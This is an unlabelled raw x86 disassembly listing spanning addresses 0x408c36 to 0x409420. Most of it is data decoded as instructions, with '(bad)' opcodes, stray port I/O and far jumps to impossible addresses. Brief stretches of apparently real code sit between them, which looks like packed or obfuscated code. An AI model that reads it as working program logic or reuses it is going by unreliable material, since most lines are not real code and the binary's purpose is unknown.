  408c36:	jle    0x408c6e
  408c38:	jno    0x408c17
  408c3a:	xchg   ecx,eax
  408c3b:	push   0x1ce4b22c
  408c40:	(bad)  
  408c41:	sbb    DWORD PTR [ecx+ebp*1-0x40],esp
  408c45:	jbe    0x408c47
  408c47:	push   ss
  408c48:	mov    ds:0x382c03ef,eax
  408c4d:	(bad)  
  408c4e:	cmp    al,0xb0
  408c50:	add    cl,BYTE PTR [edx-0x3a]
  408c53:	add    al,0x32
  408c55:	and    BYTE PTR [esi+0x2b],dl
  408c58:	xchg   BYTE PTR [edi+0x7],bh
  408c5b:	fs daa 
  408c5d:	cmp    esp,edi
  408c5f:	fild   WORD PTR [edx+0x4705baf1]
  408c65:	rcl    BYTE PTR [eax+0x16],0xf
  408c69:	out    dx,eax
  408c6a:	push   edx
  408c6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c6c:	xchg   esp,eax
  408c6d:	xchg   ecx,eax
  408c6e:	pop    esi
  408c6f:	fisttp DWORD PTR [eax]
  408c71:	sbb    cl,BYTE PTR [edx]
  408c73:	push   esp
  408c74:	ret    
  408c75:	mov    ecx,0x506ab6e3
  408c7a:	cmp    DWORD PTR [ecx],ebx
  408c7c:	es rcl bl,1
  408c7f:	push   eax
  408c80:	outs   dx,BYTE PTR ds:[esi]
  408c81:	and    edx,ecx
  408c83:	loopne 0x408c44
  408c85:	push   esp
  408c86:	gs ins DWORD PTR es:[edi],dx
  408c88:	fld    QWORD PTR [ecx+eiz*1-0x1267e08c]
  408c8f:	enter  0xb32d,0xa3
  408c93:	sub    DWORD PTR [edx-0x80],ebp
  408c96:	popa   
  408c97:	cld    
  408c98:	mov    dl,0xdd
  408c9a:	xor    dh,al
  408c9c:	push   ebx
  408c9d:	das    
  408c9e:	mov    esi,0xb46ab66c
  408ca3:	or     bh,ch
  408ca5:	in     eax,dx
  408ca6:	inc    ecx
  408ca7:	arpl   WORD PTR [ebx],bx
  408ca9:	xchg   esi,eax
  408caa:	fild   QWORD PTR [edi+0x70]
  408cad:	imul   BYTE PTR [esi+ebp*1+0x48]
  408cb1:	dec    ecx
  408cb2:	jno    0x408ca5
  408cb4:	mov    ds:0xdd414ea0,eax
  408cb9:	mov    al,0x4c
  408cbb:	retf   0x1f23
  408cbe:	cmc    
  408cbf:	mov    ch,0x23
  408cc1:	cmp    DWORD PTR [edx-0x2a],ebp
  408cc4:	mov    eax,ebx
  408cc6:	call   0x504b:0x2b2298a5
  408ccd:	xchg   esi,eax
  408cce:	mov    ebp,0xa927d325
  408cd3:	push   ebx
  408cd4:	pop    ebp
  408cd5:	push   cs
  408cd6:	sbb    eax,0x3f361dc1
  408cdb:	sbb    al,0x99
  408cdd:	push   es
  408cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408cdf:	dec    ebx
  408ce0:	jmp    0x408ca9
  408ce2:	push   ebp
  408ce3:	mov    ds:0xb70f6ef4,eax
  408ce8:	add    al,0x90
  408cea:	xor    eax,0x8a43
  408cef:	add    eax,edi
  408cf1:	mov    edi,DWORD PTR [ebp-0x14]
  408cf4:	mov    BYTE PTR [ebp+edi*1-0x58],al
  408cf8:	mov    eax,DWORD PTR [ebp-0xc]
  408cfb:	inc    edx
  408cfc:	cmp    edx,eax
  408cfe:	jne    0x408b9f
  408d04:	pop    edi
  408d05:	pop    ebx
  408d06:	mov    eax,DWORD PTR [ebp-0x8]
  408d09:	mov    edx,DWORD PTR [ebp+0x10]
  408d0c:	xor    eax,ecx
  408d0e:	jmp    0x408e37
  408d13:	inc    esp
  408d14:	(bad)  
  408d15:	jno    0x408cee
  408d17:	icebp  
  408d18:	stc    
  408d19:	js     0x408d80
  408d1b:	xchg   esp,eax
  408d1c:	ins    BYTE PTR es:[edi],dx
  408d1d:	retf   0xcfa3
  408d20:	dec    eax
  408d21:	jae    0x408cbf
  408d23:	cmp    DWORD PTR [edi],ebp
  408d25:	jle    0x408da5
  408d27:	or     bh,BYTE PTR [edi+0x7e]
  408d2a:	jle    0x408cc3
  408d2c:	push   edx
  408d2d:	sbb    ah,ah
  408d2f:	daa    
  408d30:	push   cs
  408d31:	jbe    0x408ce2
  408d33:	out    0x13,al
  408d35:	inc    eax
  408d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d37:	jl     0x408d6b
  408d39:	mov    al,ds:0x3e37fc68
  408d3e:	mov    ch,0x52
  408d40:	fisub  DWORD PTR [ecx+ecx*8+0x4c5d5f7a]
  408d47:	lahf   
  408d48:	idiv   DWORD PTR ds:0x26b2a9a0
  408d4e:	aas    
  408d4f:	mov    ds,WORD PTR [esi]
  408d51:	mov    WORD PTR [eax+0x1f],ss
  408d54:	lds    esp,FWORD PTR [edx+0x45]
  408d57:	add    DWORD PTR [ebx-0x62],edi
  408d5a:	lock pop DWORD PTR [ebx+0x13]
  408d5e:	lahf   
  408d5f:	je     0x408cf7
  408d61:	stos   BYTE PTR es:[edi],al
  408d62:	add    BYTE PTR [ecx+0x9f42ef],ch
  408d68:	fistp  DWORD PTR [ebp-0x63a02afe]
  408d6e:	push   edi
  408d6f:	cmc    
  408d70:	fst    DWORD PTR [esi-0x69]
  408d73:	or     al,0x9d
  408d75:	call   FWORD PTR [edx-0x49]
  408d78:	arpl   WORD PTR [ebx],dx
  408d7a:	test   eax,0xe18c9385
  408d7f:	retf   
  408d80:	xchg   esp,eax
  408d81:	xchg   edi,eax
  408d82:	call   0xd0b92ab9
  408d87:	gs inc eax
  408d89:	add    eax,0x1b61d681
  408d8e:	adc    BYTE PTR [eax+0x34],bl
  408d91:	loop   0x408e01
  408d93:	out    0x0,al
  408d95:	mov    esp,0x6054caa2
  408d9a:	push   ds
  408d9b:	test   eax,0xeec1059d
  408da0:	push   esp
  408da1:	lods   al,BYTE PTR ds:[esi]
  408da2:	push   ds
  408da3:	pusha  
  408da4:	or     edi,DWORD PTR [ebx+0x605bb12f]
  408daa:	in     eax,dx
  408dab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dac:	scas   eax,DWORD PTR es:[edi]
  408dad:	dec    eax
  408dae:	mov    ch,0xba
  408db0:	mov    BYTE PTR [ebx],ah
  408db2:	push   es
  408db3:	stos   DWORD PTR es:[edi],eax
  408db4:	jne    0x408d6b
  408db6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db7:	push   ecx
  408db8:	fs in  eax,0x2
  408dbb:	mov    WORD PTR [eax+0x239eca06],es
  408dc1:	cmp    eax,0x919b744f
  408dc6:	imul   edx,DWORD PTR [edx-0x6f],0xf213136
  408dcd:	les    ecx,FWORD PTR [ecx]
  408dcf:	pop    esp
  408dd0:	mov    ecx,DWORD PTR [edi+0x121592]
  408dd6:	or     BYTE PTR [ebx+ebp*2],ah
  408dd9:	push   ebp
  408dda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ddb:	xor    BYTE PTR [ebx],al
  408ddd:	add    eax,0xbe211729
  408de2:	dec    edi
  408de3:	dec    esp
  408de4:	test   al,0x68
  408de6:	(bad)  [esi]
  408de8:	jmp    0x408e20
  408dea:	dec    ecx
  408deb:	cmp    DWORD PTR [esi+0x24436835],esp
  408df1:	xor    al,0xe
  408df3:	clc    
  408df4:	or     eax,0x447560b5
  408df9:	scas   al,BYTE PTR es:[edi]
  408dfa:	dec    ecx
  408dfb:	cmp    edx,edx
  408dfd:	enter  0x1fa8,0x4b
  408e01:	rcr    DWORD PTR [ecx],cl
  408e03:	clc    
  408e04:	mov    dl,0xb3
  408e06:	push   0xc43586dd
  408e0b:	and    al,0x98
  408e0d:	lods   eax,DWORD PTR ds:[esi]
  408e0e:	jnp    0x408d95
  408e10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e11:	push   ebx
  408e12:	stc    
  408e13:	add    al,0xd6
  408e15:	(bad)  
  408e17:	stc    
  408e18:	cmp    al,0x9f
  408e1a:	mov    al,0xc2
  408e1c:	xchg   esp,eax
  408e1d:	psraw  mm0,mm0
  408e20:	aas    
  408e21:	xor    edx,DWORD PTR [esi]
  408e23:	pop    ebp
  408e24:	lods   al,BYTE PTR ds:[esi]
  408e25:	or     dh,BYTE PTR ds:0xd7e6e4d1
  408e2b:	clc    
  408e2c:	mov    esp,eax
  408e2e:	inc    edx
  408e2f:	xor    esi,esi
  408e31:	push   edi
  408e32:	sub    BYTE PTR [edx],al
  408e34:	and    DWORD PTR [eax+edx*2],edx
  408e37:	add    eax,esi
  408e39:	mov    DWORD PTR [edx],eax
  408e3b:	jmp    0x408f64
  408e40:	dec    eax
  408e41:	sub    ecx,DWORD PTR [edx]
  408e43:	lock imul edx,DWORD PTR [ecx+0x1c4aeb48],0x4b00de2b
  408e4e:	xor    bl,BYTE PTR [edx+0x35]
  408e51:	sub    al,0x7e
  408e53:	jle    0x408e5f
  408e55:	jg     0x408ed5
  408e57:	jle    0x408dde
  408e59:	push   ds
  408e5a:	sahf   
  408e5b:	daa    
  408e5c:	mov    al,ds:0xc5940745
  408e61:	fsub   QWORD PTR [edx]
  408e63:	push   edi
  408e64:	inc    esp
  408e65:	xchg   ecx,eax
  408e66:	out    0x10,eax
  408e68:	add    bh,BYTE PTR [edx+0x4c]
  408e6b:	ja     0x408e9b
  408e6d:	pop    ds
  408e6e:	sahf   
  408e6f:	bound  edi,QWORD PTR [esi]
  408e71:	in     eax,0xd6
  408e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e74:	int    0x35
  408e76:	cmc    
  408e77:	and    DWORD PTR [edi-0x5c],edx
  408e7a:	scas   al,BYTE PTR es:[edi]
  408e7b:	popa   
  408e7c:	mov    bl,0xe7
  408e7e:	daa    
  408e7f:	cli    
  408e80:	jb     0x408e74
  408e82:	jl     0x408e16
  408e84:	loopne 0x408ecd
  408e86:	in     eax,dx
  408e87:	inc    edi
  408e88:	jbe    0x408eec
  408e8a:	arpl   WORD PTR [eax-0x30],di
  408e8d:	call   0xa3cbe2d4
  408e92:	or     cl,bl
  408e94:	in     al,dx
  408e95:	or     al,BYTE PTR [ebx+0x7a9c7b94]
  408e9b:	icebp  
  408e9c:	jmp    0x3129:0xfa0932c9
  408ea3:	mov    dl,0x17
  408ea5:	sub    DWORD PTR ds:0xbd05b43d,ebp
  408eab:	in     eax,dx
  408eac:	pusha  
  408ead:	addr16 leave 
  408eaf:	js     0x408eab
  408eb1:	imul   eax,DWORD PTR [ecx+0x29],0x5f8da476
  408eb8:	pop    ds
  408eb9:	loope  0x408e91
  408ebb:	pop    es
  408ebc:	dec    ebp
  408ebd:	js     0x408eb9
  408ebf:	icebp  
  408ec0:	retf   0x7fdf
  408ec3:	adc    esp,DWORD PTR [edi]
  408ec5:	pusha  
  408ec6:	xor    al,BYTE PTR [ecx+0x2a]
  408ec9:	cmp    dh,ch
  408ecb:	std    
  408ecc:	lahf   
  408ecd:	arpl   WORD PTR [edi+0x203e2d1a],sp
  408ed3:	ins    BYTE PTR es:[edi],dx
  408ed4:	mov    ds:0xd5cdaf40,al
  408ed9:	adc    edx,DWORD PTR [edi-0x61]
  408edc:	stos   DWORD PTR es:[edi],eax
  408edd:	xchg   edi,eax
  408ede:	xor    DWORD PTR [eax],esi
  408ee0:	jno    0x408f33
  408ee2:	inc    ebx
  408ee3:	xor    al,0xd7
  408ee5:	mov    eax,ds:0x4158d59b
  408eea:	xchg   BYTE PTR [eax-0x23],cl
  408eed:	fnstsw WORD PTR [eax-0x625de207]
  408ef3:	stos   BYTE PTR es:[edi],al
  408ef4:	push   esp
  408ef5:	jnp    0x408ed5
  408ef7:	inc    ebx
  408ef8:	dec    eax
  408ef9:	sahf   
  408efa:	fdivr  DWORD PTR [ecx]
  408efc:	(bad)  
  408efd:	outs   dx,DWORD PTR ds:[esi]
  408efe:	test   esi,esi
  408f00:	add    ebp,ebp
  408f02:	lock jp 0x408f50
  408f05:	pop    ebx
  408f06:	pop    ebx
  408f07:	fwait
  408f08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f09:	mov    edx,edi
  408f0b:	leave  
  408f0c:	rcl    DWORD PTR [esi-0x1ab5dc8f],0x11
  408f13:	mov    bh,0xbc
  408f15:	in     eax,0x11
  408f17:	outs   dx,DWORD PTR ds:[esi]
  408f18:	test   ebx,0x739d913c
  408f1e:	xlat   BYTE PTR ds:[ebx]
  408f1f:	out    dx,al
  408f20:	or     eax,0x6ef96f02
  408f25:	inc    ebx
  408f26:	xchg   ebp,eax
  408f27:	sub    eax,0x813e0f15
  408f2c:	push   ebp
  408f2d:	test   BYTE PTR [edx-0x11984541],al
  408f33:	jns    0x408f6c
  408f35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f36:	sbb    al,0xe1
  408f38:	ds out 0x1a,al
  408f3b:	daa    
  408f3c:	xchg   ebx,eax
  408f3d:	mov    ebp,0x9e6433cf
  408f42:	mov    bh,0x50
  408f44:	in     eax,0x99
  408f46:	or     DWORD PTR [esi-0x4b],edx
  408f49:	lock call 0xb88a14e4
  408f4f:	jecxz  0x408fc1
  408f51:	xchg   edi,eax
  408f52:	loopne 0x408f87
  408f54:	ror    BYTE PTR [eax+ecx*4-0x1c],0x8d
  408f59:	scas   eax,DWORD PTR es:[edi]
  408f5a:	adc    BYTE PTR [edi-0x7d],cl
  408f5d:	sbb    DWORD PTR [edx],edx
  408f5f:	jne    0x408fd8
  408f61:	int3   
  408f62:	rcr    DWORD PTR [ebx-0x75],1
  408f65:	inc    ebp
  408f66:	clc    
  408f67:	xor    eax,ecx
  408f69:	add    eax,esi
  408f6b:	mov    DWORD PTR [ebp+0x8],eax
  408f6e:	mov    eax,DWORD PTR [ebp+0x8]
  408f71:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f75:	mov    dl,BYTE PTR [ebp-0x1]
  408f78:	cmp    al,dl
  408f7a:	je     0x4090e6
  408f80:	mov    eax,DWORD PTR [ebp+0x8]
  408f83:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  408f87:	mov    edx,DWORD PTR [ebp+0xc]
  408f8a:	cmp    al,BYTE PTR [edx]
  408f8c:	jne    0x40935e
  408f92:	mov    eax,DWORD PTR [ebp-0x8]
  408f95:	mov    edx,DWORD PTR [ebp+0xc]
  408f98:	jmp    0x4090c1
  408f9d:	jmp    0x7952d498
  408fa2:	loopne 0x40901d
  408fa4:	mov    ch,0xbe
  408fa6:	jmp    0x71ab935
  408fab:	jle    0x408f46
  408fad:	shr    DWORD PTR ds:0x7f0a7e7e,0x7e
  408fb4:	jle    0x408f83
  408fb6:	call   0x42f3:0x33a63c65
  408fbd:	in     al,0x83
  408fbf:	in     eax,dx
  408fc0:	sub    DWORD PTR [ebx-0x1fd80521],ebx
  408fc6:	jmp    0x408f81
  408fc8:	test   BYTE PTR [esi+0x3d7ff01a],dh
  408fce:	rcl    DWORD PTR [eax-0x25df796e],0xa1
  408fd5:	and    bh,bl
  408fd7:	sub    cl,BYTE PTR ds:[edx+0x740e97a2]
  408fde:	adc    eax,0x9c558a98
  408fe3:	test   al,0xa3
  408fe5:	rol    DWORD PTR [ebp+esi*2-0x5ae6e153],cl
  408fec:	inc    ebx
  408fed:	fld    DWORD PTR [ecx-0x2a7c3ffc]
  408ff3:	xor    BYTE PTR [ecx-0x2a],dl
  408ff6:	rcl    DWORD PTR [bx+di+0x1fb7],cl
  408ffb:	adc    al,0x82
  408ffd:	push   ebp
  408ffe:	mov    edi,0x657c1994
  409003:	dec    eax
  409004:	inc    edi
  409005:	outs   dx,DWORD PTR ds:[esi]
  409006:	pop    esp
  409007:	es mov esi,0xd3f9bd1c
  40900d:	and    esp,DWORD PTR [ecx-0x51]
  409010:	mov    ch,0xaa
  409012:	xor    eax,0x7135b675
  409017:	and    eax,DWORD PTR [eax+0x7e509854]
  40901d:	push   edi
  40901e:	repnz push eax
  409020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409021:	shr    BYTE PTR [ebx],0x75
  409024:	cmp    eax,0x6ee6f329
  409029:	loope  0x40902c
  40902b:	pushf  
  40902c:	adc    edx,ebx
  40902e:	push   es
  40902f:	(bad)  
  409030:	push   ebp
  409031:	mov    dl,0xa1
  409033:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409034:	inc    ebx
  409035:	and    BYTE PTR [ebp+0x14],ch
  409038:	dec    esp
  409039:	leave  
  40903a:	xchg   edx,eax
  40903b:	dec    ecx
  40903c:	(bad)  [ebp-0x3d4fa680]
  409042:	ins    DWORD PTR es:[edi],dx
  409043:	jae    0x40904f
  409045:	xchg   BYTE PTR [ebx-0x4f702fc3],bh
  40904b:	inc    ebx
  40904d:	aam    0x49
  40904f:	jb     0x40903e
  409051:	cdq    
  409052:	jg     0x408ffd
  409054:	push   eax
  409055:	aaa    
  409056:	push   ebx
  409057:	(bad)  
  409058:	pop    edi
  409059:	ja     0x409001
  40905b:	out    0xea,al
  40905d:	jno    0x409049
  40905f:	arpl   WORD PTR [edx-0x4265a10],ax
  409065:	cmp    BYTE PTR [esi],cl
  409067:	stos   DWORD PTR es:[edi],eax
  409068:	sub    BYTE PTR [esi+edx*8+0x1],bl
  40906c:	sub    eax,0x82dc45ec
  409071:	ret    
  409072:	stos   BYTE PTR es:[edi],al
  409073:	adc    eax,0x51410042
  409078:	lds    edi,FWORD PTR [eax]
  40907a:	ss retf 
  40907c:	div    DWORD PTR [ebp-0x1ba2be5]
  409082:	pusha  
  409083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409084:	(bad)  
  409085:	xchg   esi,eax
  409086:	xor    bl,0x22
  409089:	sahf   
  40908a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40908b:	ss (bad) 
  40908d:	js     0x4090ed
  40908f:	and    ebx,DWORD PTR [esp+eax*2]
  409092:	into   
  409093:	aad    0x69
  409095:	push   esp
  409096:	xchg   edi,eax
  409097:	ret    0x61a7
  40909a:	sbb    eax,0x1b03ff3e
  40909f:	inc    ebp
  4090a0:	pop    ebx
  4090a1:	adc    eax,0x7cb86147
  4090a6:	test   DWORD PTR [esp+ecx*4],0xe9f0f485
  4090ad:	into   
  4090ae:	cmp    eax,0xe46511a0
  4090b3:	fld    DWORD PTR [esi+0x3b99b18c]
  4090b9:	push   0x43
  4090bb:	dec    ebp
  4090bc:	loop   0x4090de
  4090be:	xchg   bh,al
  4090c0:	push   0xf
  4090c2:	mov    esi,0x3c13312
  4090c7:	(bad)  
  4090c8:	cmp    edx,eax
  4090ca:	je     0x409229
  4090d0:	mov    DWORD PTR [ebp-0x18],0x705fd8e
  4090d7:	lea    eax,[ebp-0x18]
  4090da:	mov    DWORD PTR [ebp-0x14],eax
  4090dd:	mov    eax,DWORD PTR [ebp-0x14]
  4090e0:	add    DWORD PTR [eax],0x705fa8e
  4090e6:	mov    eax,DWORD PTR [ebp-0x10]
  4090e9:	jmp    0x409212
  4090ee:	lods   eax,DWORD PTR ds:[esi]
  4090ef:	lock test BYTE PTR [ecx+edi*4],al
  4090f3:	sbb    BYTE PTR [ebp-0x47188557],ch
  4090f9:	daa    
  4090fa:	xchg   BYTE PTR [ebx+eax*4],bl
  4090fd:	outs   dx,DWORD PTR ds:[esi]
  4090fe:	frstor [edx]
  409100:	jle    0x409180
  409102:	or     bh,BYTE PTR [edi+0x7e]
  409105:	jle    0x4090ac
  409107:	mov    esi,DWORD PTR [edi-0x20fe6564]
  40910d:	or     ch,ch
  40910f:	cwde   
  409110:	fsubp  st(4),st
  409112:	lock adc al,0xc4
  409115:	(bad)  
  409116:	or     DWORD PTR [eax-0xaddd030],ecx
  40911c:	pop    eax
  40911d:	ins    BYTE PTR es:[edi],dx
  40911e:	test   DWORD PTR [ebx+0x1c],eax
  409121:	mov    bl,0x81
  409123:	lds    edx,FWORD PTR [edx]
  409125:	inc    edx
  409126:	lock je 0x40913f
  409129:	push   esi
  40912a:	std    
  40912b:	retf   
  40912c:	mov    edi,0x30a742e3
  409131:	or     bh,BYTE PTR [ebx-0x6]
  409134:	ret    0x7fb0
  409137:	cmp    eax,0xd3582104
  40913c:	in     al,0xd
  40913e:	fcmovu st,st(6)
  409140:	jmp    0x649c:0xf5ffd40f
  409147:	fild   DWORD PTR [eax+0x35389181]
  40914d:	imul   eax,ebp,0x1f8612b9
  409153:	add    bh,BYTE PTR [ebx-0x640f0d89]
  409159:	mov    eax,ds:0xf655e356
  40915e:	or     ecx,DWORD PTR [eax]
  409160:	cmc    
  409161:	mov    ebx,0x71adb01b
  409166:	inc    eax
  409167:	cmp    al,0xa9
  409169:	retf   0xdb90
  40916c:	test   DWORD PTR [esi+0x6539fbf1],0x9d1eefc1
  409176:	mov    esi,0xa1cfc916
  40917b:	and    BYTE PTR [ebx+0x5ff67f18],bh
  409181:	jl     0x409108
  409183:	lods   al,BYTE PTR ds:[esi]
  409184:	stos   BYTE PTR es:[edi],al
  409185:	test   al,0xfb
  409187:	dec    ebx
  409188:	sahf   
  409189:	hlt    
  40918a:	fidiv  WORD PTR [edx-0x513b7492]
  409190:	mov    edi,0x19f395a1
  409195:	into   
  409196:	push   esi
  409197:	or     BYTE PTR [edi],al
  409199:	xor    dh,ah
  40919b:	xor    dl,BYTE PTR [edi]
  40919d:	neg    DWORD PTR [ebp+0x66ba4526]
  4091a3:	and    ecx,DWORD PTR [ebp+0x4239a851]
  4091a9:	dec    ecx
  4091aa:	(bad)  
  4091ab:	out    0x66,eax
  4091ad:	xor    DWORD PTR [ecx],esp
  4091af:	test   eax,0xe365dca5
  4091b4:	sub    BYTE PTR [edi-0x40df408e],dh
  4091ba:	sbb    DWORD PTR [edx],ebp
  4091bc:	pop    ss
  4091bd:	cld    
  4091be:	dec    esi
  4091bf:	imul   esp,DWORD PTR [eax+0x61],0x6
  4091c3:	or     BYTE PTR [ecx-0x50],bh
  4091c6:	dec    ebx
  4091c7:	out    0x89,al
  4091c9:	stos   BYTE PTR es:[edi],al
  4091ca:	jmp    0xc28ce8a8
  4091cf:	cmc    
  4091d0:	xchg   esp,eax
  4091d1:	and    DWORD PTR ds:0xad8bd34b,ebx
  4091d7:	loopne 0x40923f
  4091d9:	or     edx,DWORD PTR [eax+esi*4-0x2d158ec1]
  4091e0:	ss gs cmp eax,0x81d8e4c2
  4091e7:	dec    ecx
  4091e8:	mov    esi,esi
  4091ea:	push   es
  4091eb:	sub    bh,BYTE PTR [edx-0x50]
  4091ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4091ef:	cmp    dl,bh
  4091f1:	adc    DWORD PTR [edi],0x69
  4091f4:	push   edi
  4091f5:	xor    BYTE PTR ds:0x1f863627,dl
  4091fb:	mov    esi,0x1bcc2135
  409200:	rcr    edi,cl
  409202:	xchg   esi,eax
  409204:	call   0x916e84f8
  409209:	cdq    
  40920a:	add    eax,0x3eb51357
  40920f:	sub    ebp,edx
  409211:	sbb    DWORD PTR [ebx-0x3eccf7ab],ecx
  409217:	lea    eax,[eax+edx*1+0x32729f]
  40921e:	mov    DWORD PTR [ebp+0x8],eax
  409221:	inc    DWORD PTR [ebp+0xc]
  409224:	jmp    0x408f6e
  409229:	mov    eax,DWORD PTR [ebp-0x10]
  40922c:	xor    eax,ecx
  40922e:	jmp    0x409357
  409233:	or     DWORD PTR ds:0xd93acb2e,ebx
  409239:	stc    
  40923a:	(bad)  [ecx-0x74785839]
  409240:	xchg   esi,eax
  409241:	sub    ecx,edx
  409243:	jmp    0xabf106b
  409248:	jg     0x4092c8
  40924a:	jle    0x409204
  40924c:	xchg   edx,eax
  40924d:	inc    edx
  40924e:	aad    0x84
  409250:	xchg   edi,eax
  409251:	rcr    BYTE PTR [ebx+ebp*4+0x66],0x46
  409256:	adc    BYTE PTR [ebp-0x71],ch
  409259:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40925a:	out    dx,eax
  40925b:	adc    ebx,ebp
  40925d:	inc    edx
  40925e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40925f:	ret    
  409260:	fwait
  409261:	mov    eax,0x66661164
  409266:	jb     0x4092e5
  409268:	test   dl,al
  40926a:	mov    ds,WORD PTR [eax]
  40926c:	pop    edx
  40926d:	fidivr DWORD PTR [ebx-0x61]
  409270:	mov    al,ds:0x61786514
  409275:	xor    DWORD PTR [eax+0x31],0xe0f1ea36
  40927c:	js     0x4092c9
  40927e:	jecxz  0x40920b
  409280:	and    eax,0x2701bb1b
  409285:	push   esi
  409286:	enter  0xb6f6,0xce
  40928a:	and    BYTE PTR [esi],cl
  40928c:	push   edi
  40928d:	mov    al,0xf4
  40928f:	push   esi
  409290:	or     ebp,DWORD PTR [ebp-0x630ffaaa]
  409296:	(bad)  
  409297:	std    
  409298:	and    DWORD PTR [eax-0x4d],edx
  40929b:	sub    dh,BYTE PTR [edx]
  40929d:	int3   
  40929e:	nop
  40929f:	jecxz  0x40929d
  4092a1:	loop   0x4092ec
  4092a3:	call   0x5a7d4072
  4092a8:	jo     0x409294
  4092aa:	xchg   edi,eax
  4092ab:	sbb    DWORD PTR [esi+edi*8],eax
  4092ae:	dec    edi
  4092af:	stos   BYTE PTR es:[edi],al
  4092b0:	das    
  4092b1:	les    edi,FWORD PTR [edx+edi*2+0x26]
  4092b5:	sub    DWORD PTR [ebx+0x45c30257],0x3b
  4092bc:	jmp    0x4092e9
  4092be:	mov    eax,0x755ea802
  4092c3:	(bad)  
  4092c4:	retf   
  4092c5:	cli    
  4092c6:	into   
  4092c7:	adc    ebp,DWORD PTR [edi+0x50]
  4092ca:	pop    ebx
  4092cb:	data16 sar BYTE PTR [ecx],1
  4092ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092cf:	mov    bl,ch
  4092d1:	pop    edx
  4092d2:	adc    BYTE PTR [eax],al
  4092d4:	aad    0x51
  4092d6:	dec    ebx
  4092d7:	les    ebp,FWORD PTR [ebp-0x53]
  4092da:	or     DWORD PTR [edi-0x14],edi
  4092dd:	mov    ds:0xebdfc247,eax
  4092e2:	mov    BYTE PTR [ebx],al
  4092e4:	or     al,0x15
  4092e6:	inc    ebp
  4092e7:	xor    esi,DWORD PTR [ecx-0x19]
  4092ea:	das    
  4092eb:	int    0x95
  4092ed:	fsubr  DWORD PTR [ebx+edx*8-0x2c]
  4092f1:	mov    ebp,0x47f48f5c
  4092f6:	(bad)  
  4092f8:	lahf   
  4092f9:	and    eax,0x2b09d3ab
  4092fe:	push   ebp
  4092ff:	ja     0x409292
  409301:	and    bh,BYTE PTR [ecx+0x4ee3b9df]
  409307:	jbe    0x409289
  409309:	push   ebx
  40930a:	sbb    eax,0x9118a063
  40930f:	push   ss
  409310:	and    bh,ah
  409312:	in     al,dx
  409313:	das    
  409314:	pusha  
  409315:	adc    dl,BYTE PTR [eax-0x1f]
  409318:	xor    eax,DWORD PTR [edx-0x6e]
  40931b:	cmc    
  40931c:	mov    al,ds:0xc54c7e75
  409321:	mov    edi,0xe9bc74ba
  409326:	fistp  WORD PTR [edx+eax*1+0x574ffab1]
  40932d:	pop    es
  40932e:	jnp    0x409318
  409330:	sub    cl,dh
  409332:	cmp    ebp,esp
  409334:	pop    ecx
  409335:	mov    edx,DWORD PTR [ecx+edx*1+0x21]
  409339:	fadd   DWORD PTR [eax+edi*4+0x3c]
  40933d:	cld    
  40933e:	not    BYTE PTR [esi-0x3e]
  409341:	jb     0x409345
  409343:	adc    eax,0x6c7ca1e6
  409348:	and    DWORD PTR [edx-0x5505ff1c],edi
  40934e:	gs mov ch,bh
  409351:	call   0x8b0a:0xc6c06804
  409358:	dec    ebp
  409359:	adc    BYTE PTR [ebx],al
  40935b:	(bad)  
  40935c:	mov    DWORD PTR [ecx],eax
  40935e:	pop    esi
  40935f:	leave  
  409360:	ret    0xc
  409363:	push   ebp
  409364:	mov    ebp,esp
  409366:	push   ecx
  409367:	not    eax
  409369:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409370:	mov    eax,DWORD PTR [ebp-0x4]
  409373:	mov    edx,DWORD PTR [ebp+0x10]
  409376:	add    DWORD PTR ds:0x4235d7,ebx
  40937c:	mov    ecx,0x7510859
  409381:	adc    DWORD PTR ds:0x41235c,0x4235d7
  40938b:	xor    eax,ecx
  40938d:	add    eax,0x32729f
  409392:	and    DWORD PTR ds:0x412368,0x417e41
  40939c:	mov    DWORD PTR [edx],eax
  40939e:	mov    eax,DWORD PTR [ebp+0xc]
  4093a1:	and    DWORD PTR ds:0x4235cf,0x0
  4093ab:	jmp    0x4093bd
  4093b0:	mov    edx,DWORD PTR ds:0x4235cf
  4093b6:	inc    edx
  4093b7:	mov    DWORD PTR ds:0x4235cf,edx
  4093bd:	cmp    DWORD PTR ds:0x4235cf,0x14
  4093c4:	jae    0x4093eb
  4093ca:	cmp    DWORD PTR ds:0x4235cf,0x1c
  4093d1:	jne    0x4093e0
  4093d7:	push   DWORD PTR [ebp-0x20]
  4093da:	call   DWORD PTR ds:0x40d1e8
  4093e0:	jmp    0x4093b0
  4093e5:	sub    DWORD PTR ds:0x41237c,ebx
  4093eb:	xor    eax,ecx
  4093ed:	adc    edx,DWORD PTR ds:0x412360
  4093f3:	push   esi
  4093f4:	add    esi,edx
  4093f6:	mov    esi,DWORD PTR [ebp+0x10]
  4093f9:	mov    edx,0x32729f
  4093fe:	add    eax,edx
  409400:	xor    DWORD PTR ds:0x41abda,0x417e49
  40940a:	mov    DWORD PTR [esi+0x4],eax
  40940d:	mov    eax,ds:0x412398
  409412:	mov    esi,DWORD PTR ds:0x420127
  409418:	sub    esi,eax
  40941a:	xor    eax,DWORD PTR [eax+esi*1]
  40941d:	mov    eax,DWORD PTR [ebp+0x14]
  409420:	mov    esi,DWORD PTR [ebp+0x10]
